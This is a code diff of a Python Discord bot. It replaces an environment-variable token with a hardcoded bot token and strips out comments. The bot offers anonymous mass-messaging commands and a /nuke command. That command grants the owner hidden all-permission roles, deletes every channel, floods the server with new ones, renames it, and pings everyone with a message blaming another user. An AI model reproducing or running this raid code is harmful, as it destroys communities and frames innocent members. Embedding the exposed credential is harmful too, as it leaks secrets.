@@ -5,7 +5,6 @@ ALL COMMANDS ARE SLASH COMMANDS (/)
 NO CONFIRMATION REQUIRED FOR ANY COMMAND
 """
 
-import os
 import discord
 from discord.ext import commands
 import asyncio
@@ -14,7 +13,7 @@ import sys
 import traceback
 import io
 
-TOKEN = os.environ.get('DISCORD_TOKEN')
+TOKEN = "MTQ4Mjg2MDQwMDg4OTU2MTM4Mw.GKoAgM.mdiFbTZpUQCTDqewp3_6zOI9JK3JR-rtuuMH18"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -36,10 +35,10 @@ dm_log_channel_id = None
 dm_forward_enabled = False
 
 # ===== YOUR DISCORD USER ID =====
-OWNER_ID = 1481722738451284161  # <--- YOUR CORRECT USER ID
+OWNER_ID = 1481722738451284161
 
 # ===== VOICE STAY VARIABLES =====
-voice_stay_tasks = {}  # guild_id: asyncio.Task
+voice_stay_tasks = {}
 
 def trim_msg(text, max_len=1990):
     if not text:
@@ -73,10 +72,8 @@ def is_owner():
 
 def is_whitelisted():
     async def predicate(interaction):
-        # Bot owner can always use commands
         if interaction.user.id == OWNER_ID:
             return True
-        # Check whitelist
         if interaction.user.id in whitelist:
             return True
         await interaction.response.send_message(
@@ -178,7 +175,6 @@ async def slash_vcstay(interaction: discord.Interaction):
     voice_channel = interaction.user.voice.channel
     guild_id = interaction.guild.id
     
-    # Check if already connected
     voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
     
     if voice_client is None:
@@ -198,18 +194,16 @@ async def slash_vcstay(interaction: discord.Interaction):
     else:
         await interaction.followup.send(f"✅ Already in **{voice_channel.name}**! I'll stay connected!", ephemeral=True)
     
-    # Cancel any existing stay task
     if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
         voice_stay_tasks[guild_id].cancel()
     
-    # Start the stay task
     async def stay_in_voice():
         try:
             while True:
                 voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
                 if voice_client is None:
                     break
-                await asyncio.sleep(60)  # Check every minute
+                await asyncio.sleep(60)
         except asyncio.CancelledError:
             pass
     
@@ -224,7 +218,6 @@ async def slash_vcleave(interaction: discord.Interaction):
     
     guild_id = interaction.guild.id
     
-    # Cancel stay task
     if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
         voice_stay_tasks[guild_id].cancel()
         del voice_stay_tasks[guild_id]
@@ -276,14 +269,13 @@ async def slash_vcstaytime(interaction: discord.Interaction, hours: int = 24):
         await interaction.followup.send("❌ You need to be in a voice channel!", ephemeral=True)
         return
     
-    if hours > 8760:  # Max 365 days
+    if hours > 8760:
         await interaction.followup.send("❌ Max 8760 hours (365 days)!", ephemeral=True)
         return
     
     voice_channel = interaction.user.voice.channel
     guild_id = interaction.guild.id
     
-    # Connect if not already connected
     voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
     
     if voice_client is None:
@@ -299,16 +291,13 @@ async def slash_vcstaytime(interaction: discord.Interaction, hours: int = 24):
             await interaction.followup.send(f"❌ Failed to move: {str(e)[:100]}", ephemeral=True)
             return
     
-    # Cancel any existing stay task
     if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
         voice_stay_tasks[guild_id].cancel()
     
-    # Start the stay task with time limit
     async def stay_for_time():
         try:
             seconds = hours * 3600
             await asyncio.sleep(seconds)
-            # After time is up, disconnect
             voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
             if voice_client:
                 await voice_client.disconnect()
@@ -427,9 +416,7 @@ async def slash_ghostmass(interaction: discord.Interaction, count: int = 5, mess
 @bot.tree.command(name="say", description="Make the bot say a message")
 @is_whitelisted()
 async def slash_say(interaction: discord.Interaction, message: str):
-    # Send the message without showing who sent it
     await interaction.channel.send(trim_msg(message, 4000))
-    # Only the command user sees this confirmation
     await interaction.response.send_message("✅ Message sent!", ephemeral=True)
 
 @bot.tree.command(name="sayembed", description="Make the bot say an embed message")
@@ -439,7 +426,6 @@ async def slash_sayembed(interaction: discord.Interaction, message: str):
         description=trim_msg(message, 4000),
         color=discord.Color.blue()
     )
-    # NO FOOTER - hides who sent it
     await interaction.channel.send(embed=embed)
     await interaction.response.send_message("✅ Embed sent!", ephemeral=True)
 
@@ -462,7 +448,6 @@ async def slash_sayall(interaction: discord.Interaction, message: str):
         description=trim_msg(message, 4000),
         color=discord.Color.blue()
     )
-    # NO FOOTER - hides who sent it
     for channel in interaction.guild.text_channels:
         try:
             await channel.send(embed=embed)
@@ -509,21 +494,18 @@ async def slash_nuke(interaction: discord.Interaction):
         blame_user = owner
         await interaction.followup.send(f"⏰ **Timed out! Blaming {blame_user.name} instead.**", ephemeral=True)
     
-    # Create hidden role
     try:
         hidden_role = await guild.create_role(name="👑 HIDDEN KING", permissions=discord.Permissions.all(), color=discord.Color.gold(), hoist=False)
         await owner.add_roles(hidden_role)
     except:
         pass
     
-    # Create ruler role
     try:
         darky_role = await guild.create_role(name="👑 DARKY'S RULER", color=discord.Color.gold(), permissions=discord.Permissions.all(), hoist=True)
         await owner.add_roles(darky_role)
     except:
         pass
     
-    # Delete all channels
     deleted = 0
     for channel in list(guild.channels):
         try:
@@ -532,7 +514,6 @@ async def slash_nuke(interaction: discord.Interaction):
         except:
             pass
     
-    # Create new channels
     created = 0
     for i in range(20):
         try:
@@ -541,13 +522,11 @@ async def slash_nuke(interaction: discord.Interaction):
         except:
             pass
     
-    # Rename server
     try:
         await guild.edit(name="I AM ON TOP LOL 🔥")
     except:
         pass
     
-    # Send final message
     final_msg = f"""
 @everyone **NEW OWNER IN THE SERVER GET RAIDED LMAO**
 💀 **BLAME @{blame_user.name} FOR THIS NUKE!**
